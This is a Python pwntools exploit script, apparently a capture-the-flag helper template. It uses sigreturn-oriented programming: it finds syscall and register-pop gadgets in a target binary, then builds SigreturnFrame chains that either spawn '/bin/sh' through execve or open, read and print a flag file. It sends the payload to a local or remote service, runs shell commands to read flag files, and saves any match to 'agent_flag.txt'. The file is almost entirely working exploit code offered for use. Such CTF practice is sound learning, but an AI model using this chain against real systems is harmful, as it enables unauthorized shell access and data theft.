#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
context.log_level = os.getenv("LOG", "info")

def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def emit(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


# Find syscall gadget
syscall_ret = None
syscall_gadget = None

# Search for syscall; ret pattern
for gadget in [b"\x0f\x05\xc3", b"\x0f\x05"]:  # syscall; ret or just syscall
    addr = next(elf.search(gadget), None)
    if addr:
        syscall_ret = addr
        log.info(f"Found syscall gadget at {addr:#x}")
        break

if not syscall_ret:
    # Try ROPgadget
    log.warning("syscall gadget not found in binary")
    log.info("Try: ROPgadget --binary ./chall | grep syscall")
    # May need to use libc syscall
    log.info("If libc is available, search there for syscall gadget")

# Find useful gadgets for setting registers
rop = ROP(elf)
pop_rax = rop.find_gadget(["pop rax", "ret"])[0] if rop.find_gadget(["pop rax", "ret"]) else None
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0] if rop.find_gadget(["pop rdi", "ret"]) else None
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0] if rop.find_gadget(["pop rsi", "ret"]) else None
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0] if rop.find_gadget(["pop rdx", "ret"]) else None

log.info(f"pop rax: {pop_rax:#x}" if pop_rax else "pop rax: not found")
log.info(f"pop rdi: {pop_rdi:#x}" if pop_rdi else "pop rdi: not found")
log.info(f"pop rsi: {pop_rsi:#x}" if pop_rsi else "pop rsi: not found")
log.info(f"pop rdx: {pop_rdx:#x}" if pop_rdx else "pop rdx: not found")


def build_sigreturn_frame(
    rax=0, rdi=0, rsi=0, rdx=0,
    r8=0, r9=0, r10=0, r11=0,
    r12=0, r13=0, r14=0, r15=0,
    rip=0, cs=0, rflags=0, rsp=0, ss=0
):
    """
    Build a SigreturnFrame for SROP (Sigreturn-Oriented Programming).
    
    On x86_64, sigreturn restores ALL registers from the stack frame.
    We just need to set rax = 15 (SYS_rt_sigreturn) and trigger a syscall.
    """
    frame = SigreturnFrame()
    frame.rax = rax
    frame.rdi = rdi
    frame.rsi = rsi
    frame.rdx = rdx
    frame.r8 = r8
    frame.r9 = r9
    frame.r10 = r10
    frame.r11 = r11
    frame.r12 = r12
    frame.r13 = r13
    frame.r14 = r14
    frame.r15 = r15
    frame.rip = rip if rip else syscall_ret
    frame.cs = cs if cs else 0x33  # Default CS for x86_64
    frame.rflags = rflags if rflags else 0x246  # Default flags
    frame.rsp = rsp if rsp else 0
    frame.ss = ss if ss else 0x2b  # Default SS for x86_64
    return bytes(frame)


def srop_execve(binsh_addr):
    """
    Use SROP to call execve("/bin/sh", NULL, NULL).
    
    Requirements:
    - syscall_ret: address of syscall; ret gadget
    - pop_rax: address of pop rax; ret gadget (or write rax=15 another way)
    - binsh_addr: address of "/bin/sh" string
    
    If pop_rax is not available, we can try:
    - read() to control rax
    - Signal handler that sets rax
    - Other rax-setting gadgets
    """
    if not syscall_ret:
        log.error("syscall gadget required for SROP")
        return None
    
    if not pop_rax:
        log.warning("pop rax not found - trying alternative rax setting")
        log.info("May need: read(0, buf, 15) to set rax=15, then sigreturn")
        # This is more complex - implement per challenge
        return None
    
    # Build sigreturn frame for execve("/bin/sh", NULL, NULL)
    frame = build_sigreturn_frame(
        rax=59,        # SYS_execve = 59
        rdi=binsh_addr,  # "/bin/sh"
        rsi=0,           # argv = NULL
        rdx=0,           # envp = NULL
        rip=syscall_ret  # Return to syscall after sigreturn
    )
    
    # Chain: pop rax(15) -> syscall (triggers sigreturn) -> frame (calls execve)
    chain = [
        pop_rax,
        15,          # SYS_rt_sigreturn = 15
        syscall_ret, # Trigger sigreturn
        frame        # SigreturnFrame that calls execve
    ]
    
    return chain


def srop_open_read_write(flag_path_addr, buf_addr=0, size=0x100):
    """
    Use SROP for ORW (Open-Read-Write) to read a flag file.
    
    Useful when execve is blocked by seccomp.
    
    Requirements:
    - flag_path_addr: address of flag path string (e.g., "/flag\0")
    - buf_addr: writable buffer address (use bss if 0)
    - size: bytes to read
    """
    if not syscall_ret or not pop_rax:
        log.error("syscall and pop rax required for ORW SROP")
        return None
    
    if buf_addr == 0:
        buf_addr = elf.bss(0x200)  # Use BSS as buffer
        log.info(f"Using BSS buffer at {buf_addr:#x}")
    
    # Build three frames chained together:
    # 1. open(flag_path, O_RDONLY, 0) -> fd in rax
    # 2. read(fd, buf, size) -> read flag into buffer
    # 3. write(1, buf, size) -> print flag
    
    frame1 = build_sigreturn_frame(
        rax=2,             # SYS_open = 2
        rdi=flag_path_addr, # path
        rsi=0,             # O_RDONLY = 0
        rdx=0,             # mode = 0
        rip=syscall_ret    # Return to syscall
    )
    
    frame2 = build_sigreturn_frame(
        rax=0,             # SYS_read = 0
        rdi=3,             # fd = 3 (opened file)
        rsi=buf_addr,      # buffer
        rdx=size,          # size
        rip=syscall_ret    # Return to syscall
    )
    
    frame3 = build_sigreturn_frame(
        rax=1,             # SYS_write = 1
        rdi=1,             # fd = 1 (stdout)
        rsi=buf_addr,      # buffer
        rdx=size,          # size
        rip=syscall_ret    # Return to syscall
    )
    
    # Chain: three sigreturn sequences
    chain = [
        pop_rax, 15, syscall_ret, frame1,  # open
        pop_rax, 15, syscall_ret, frame2,  # read
        pop_rax, 15, syscall_ret, frame3,  # write
    ]
    
    return chain


if __name__ == "__main__":
    log.info("SROP helper template loaded")

    if not syscall_ret:
        raise SystemExit("TODO: find syscall gadget before using SROP")

    if not pop_rax:
        log.info("Alternative: use read() return value or another gadget to set rax=15")
        raise SystemExit("TODO: find pop rax or an rax=15 setup")

    binsh = next(elf.search(b"/bin/sh\x00"), None)
    if not binsh and os.path.exists("./libc.so.6"):
        libc = ELF("./libc.so.6", checksec=False)
        binsh = next(libc.search(b"/bin/sh\x00"), None)
        log.info("Using /bin/sh candidate from libc; set libc.address before final use")

    ORW = os.getenv("ORW", "0") == "1"
    if ORW:
        log.info("ORW SROP requires a verified writable flag path and output fd first")
        raise SystemExit("TODO: write flag path into memory, then call srop_open_read_write()")

    if not binsh:
        raise SystemExit("TODO: provide /bin/sh address or switch to ORW mode")

    chain = srop_execve(binsh)
    if not chain:
        raise SystemExit("TODO: build a verified SROP chain")

    payload = flat({OFFSET: chain})
    log.info("Built SROP payload of %d bytes", len(payload))

    if os.getenv("RUN", "0") != "1":
        log.info("Dry-run only. Set RUN=1 after verifying offset, syscall gadget, rax setup, and /bin/sh base.")
        raise SystemExit(0)

    io = start()
    io.sendline(payload)
    io.sendline(b"cat flag* 2>/dev/null || cat /flag 2>/dev/null || id")
    emit(io.recvall(timeout=3))
